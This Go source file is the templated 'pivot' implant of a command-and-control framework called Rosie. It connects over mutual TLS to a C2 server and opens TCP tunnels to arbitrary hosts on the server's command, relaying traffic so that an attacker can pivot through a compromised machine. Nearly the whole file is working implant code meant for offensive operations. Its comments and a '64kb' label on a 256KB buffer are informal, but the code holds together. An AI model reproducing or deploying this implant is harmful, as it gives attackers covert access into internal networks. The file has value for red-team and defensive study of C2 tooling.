package main

/*
 * Rosie pivot code, since we dynamically render and compile this file
 * I've tried to keep the code in as few files as possible, same w/Client.
 */

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	pb "rosie/protobuf"

	"github.com/golang/protobuf/proto"
)

const (
	pivotName    = `{{.Name}}`
	pivotKeyPEM  = `{{.Key}}`
	pivotCertPEM = `{{.Cert}}`
	caCertPEM    = `{{.CACert}}`

	defaultServerIP    = `{{.DefaultServer}}`
	defaultServerLport = 8444

	timeout     = 30 * time.Second
	readBufSize = 256 * 1024  // 64kb
	zeroReadsLimit = 10

	// ---------------
	// Pivot Messages
	// ---------------

	// TCPTunnelMsg - Holds data related to setting up a TCP tunnel
	TCPTunnelMsg = "tcp-tunnel"
	// PivotInitMsg - Sends pivot metadata to server
	PivotInitMsg = "pivot-init"
	// DataMsg - Connection data
	DataMsg = "d"
)

// Tunnel - Holds tunnel channels/metadata
type Tunnel struct {
	ID         string
	ToClient   chan []byte
	FromClient chan []byte
}

var (
	server *string
	lport  *int

	tunnels = map[string]Tunnel{} // TODO: Add mutex

	messageHandlers = map[string]interface{}{
		DataMsg:      dataHandler,
		TCPTunnelMsg: tcpTunnelInitHandler,
	}
)

func main() {

	log.SetFlags(log.LstdFlags | log.Lshortfile)

	server = flag.String("server", defaultServerIP, "server address")
	lport = flag.Int("lport", defaultServerLport, "server listen port")
	flag.Parse()

	log.Printf("Hello my name is %s", pivotName)
	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
	conn := tlsConnect(*server, uint16(*lport))
	defer conn.Close()

	broker := NewBroker()
	go broker.Start()

	pivotInit(broker)
	log.Printf("Waiting for messages ...")
	recv := broker.Subscribe()
	for envelope := range recv {
		handler, ok := messageHandlers[envelope.Type]
		if ok {
			go handler.(func(*Broker, []byte))(broker, envelope.Data)
		} else {
			log.Printf("No message handler for type: '%s'", envelope.Type)
		}
	}
}

// ----------------------
// Broker Implementation
// ----------------------

// Broker - Holds all the channels used for communication
type Broker struct {
	stopCh    chan struct{}
	publishCh chan pb.Envelope
	subCh     chan chan pb.Envelope
	unsubCh   chan chan pb.Envelope
	sendCh    chan pb.Envelope
}

// NewBroker - Instanciate new broker
func NewBroker() *Broker {
	return &Broker{
		stopCh:    make(chan struct{}),
		publishCh: make(chan pb.Envelope, 1),
		subCh:     make(chan chan pb.Envelope, 1),
		unsubCh:   make(chan chan pb.Envelope, 1),
		sendCh:    make(chan pb.Envelope, 1),
	}
}

// Start - Start the main broker loop
func (broker *Broker) Start() {
	c2Connect(broker)
	subscribers := map[chan pb.Envelope]struct{}{}
	for {
		select {
		case <-broker.stopCh:
			log.Printf("Closing subscriber channels ...")
			for msgCh := range subscribers {
				close(msgCh)
			}
			return
		case msgCh := <-broker.subCh:
			subscribers[msgCh] = struct{}{}
		case msgCh := <-broker.unsubCh:
			delete(subscribers, msgCh)
		case msg := <-broker.publishCh:
			for msgCh := range subscribers {
				msgCh <- msg
			}
		}
	}
}

// Stop - Close down all channels
func (broker *Broker) Stop() {
	close(broker.stopCh)
}

// Subscribe - Generate a new subscription channel
func (broker *Broker) Subscribe() chan pb.Envelope {
	msgCh := make(chan pb.Envelope, 5)
	broker.subCh <- msgCh
	return msgCh
}

// Unsubscribe - Remove a subscription channel
func (broker *Broker) Unsubscribe(msgCh chan pb.Envelope) {
	broker.unsubCh <- msgCh
	close(msgCh)
}

// Publish - Push a message to all subscribers
func (broker *Broker) Publish(msg pb.Envelope) {
	broker.publishCh <- msg
}

// SendMessage - Send a message to the remote connection
func (broker *Broker) SendMessage(msgType string, msg []byte) {
	envelope := pb.Envelope{
		Type: msgType,
		Data: msg,
	}
	broker.sendCh <- envelope
}

// pivotInit - Sends connection metadata to server
func pivotInit(broker *Broker) {
	pivotInit := &pb.PivotInit{
		Name: pivotName,
	}
	data, _ := proto.Marshal(pivotInit)
	broker.SendMessage(PivotInitMsg, data)
}

func dataHandler(broker *Broker, msg []byte) {
	data := &pb.Data{}
	proto.Unmarshal(msg, data)
	tun, ok := tunnels[data.TunnelID]
	if ok {
		tun.FromClient <- data.Payload
	}
}

// tcpTunnelInitHandler - Initializes a TCP tunnel to the client
func tcpTunnelInitHandler(broker *Broker, msg []byte) {
	tun := &pb.TCPTunnelInit{}
	proto.Unmarshal(msg, tun)

	address := fmt.Sprintf("%s:%d", tun.RemoteAddress, tun.RemotePort)
	recv := broker.Subscribe()
	defer broker.Unsubscribe(recv)

	rConn, err := net.Dial("tcp", address)
	if err == nil {
		log.Printf("Connection successful, setting up tunnel")
		
		// Send empty data packet to kick-start connection
		data, _ := proto.Marshal(&pb.Data{
			TunnelID: tun.ID,
			EOF:      false,
		})
		broker.SendMessage(DataMsg, data)

		go func() {
			defer func() {
				log.Printf("[Remote] Closing connection to %s (%s)", rConn.RemoteAddr(), tun.ID)
				rConn.Close() // This will terminate the lower .Read() loop
			}()
			for envelope := range recv {
				if envelope.Type == DataMsg {
					dataPkt := &pb.Data{}
					proto.Unmarshal(envelope.Data, dataPkt)
					if dataPkt.TunnelID == tun.ID {
						log.Printf("[Remote] Write %d bytes (%s)\n", len(dataPkt.Payload), tun.ID)
						if 0 < len(dataPkt.Payload) {
							rConn.Write(dataPkt.Payload)
						}
						if dataPkt.EOF {
							return
						}
					}
				}
			}
		}()

		zeroReads := 0
		readBuf := make([]byte, readBufSize)
		for {
			n, err := rConn.Read(readBuf)
			log.Printf("[Remote] Read %d bytes (%s)\n", len(readBuf[:n]), tun.ID)
			dataPkt, _ := proto.Marshal(&pb.Data{
				TunnelID: tun.ID,
				Payload:  readBuf[:n],
				EOF: err == io.EOF,
			})
			broker.SendMessage(DataMsg, dataPkt)
			if err == io.EOF {
				log.Printf("[Remote] Read EOF (%s)", tun.ID)
				break
			}
			if n == 0 {
				zeroReads++
				if zeroReads > zeroReadsLimit {
					log.Printf("[Remote] Zero reads limit reached (%s)", tun.ID)
					break
				}
			} else {
				zeroReads = 0
			}
		}
		log.Printf("[Remote] Read loop exit (%s)", tun.ID)

	} else {
		log.Printf("Tunnel init error: %v", err)
		data, _ := proto.Marshal(&pb.Data{
			TunnelID: tun.ID,
			EOF:      true,
			Errors:   fmt.Sprintf("%s", err),
		})
		broker.SendMessage(DataMsg, data)
	}
}

// ----------------------
// Network Communication
// ----------------------
// c2Connect - Connect to server and get channels for send/recv
func c2Connect(broker *Broker) {
	log.Printf("Connecting to %s:%d ...\n", *server, *lport)
	conn := tlsConnect(*server, uint16(*lport))

	go func() {
		defer func() {
			log.Printf("Clean up channels/connections ...")
			conn.Close()
			broker.Stop()
		}()
		for {
			envelope, err := socketReadMessage(conn)
			if err != nil {
				return
			}
			broker.Publish(envelope)
		}
	}()

	// Convert channel back to socket writes
	go func() {
		for envelope := range broker.sendCh {
			socketWriteMessage(conn, envelope)
		}
	}()
}

// socketWriteMessage - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the reciever can delimit messages properly
func socketWriteMessage(connection *tls.Conn, envelope pb.Envelope) error {
	data, err := proto.Marshal(&envelope)
	if err != nil {
		log.Print("Envelope marshaling error: ", err)
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

// socketReadMessage - Reads a message from the TLS connection using length prefix framing
func socketReadMessage(connection *tls.Conn) (pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		log.Printf("Socket error (read msg-length): %v\n", err)
		return pb.Envelope{}, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			log.Printf("Read error: %s\n", err)
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		log.Printf("Unmarshaling envelope error: %v", err)
		return pb.Envelope{}, err
	}

	return *envelope, nil
}

// tlsConnect - Get a TLS connection or die trying
func tlsConnect(address string, port uint16) *tls.Conn {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		log.Printf("Unable to connect: %v", err)
		os.Exit(4)
	}
	return connection
}

func getTLSConfig() *tls.Config {

	// Load pivot certs
	pivotCertPEM, err := tls.X509KeyPair([]byte(pivotCertPEM), []byte(pivotKeyPEM))
	if err != nil {
		log.Printf("Cannot load pivot certificate: %v", err)
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:          []tls.Certificate{pivotCertPEM},
		RootCAs:               caCertPool,
		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: rootOnlyVerifyCertificate,
	}
	tlsConfig.BuildNameToCertificate()

	return tlsConfig
}

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		log.Printf("Failed to parse root certificate")
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		log.Printf("Failed to parse certificate: " + err.Error())
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	opts := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(opts); err != nil {
		log.Printf("Failed to verify certificate: " + err.Error())
		return err
	}

	return nil
}
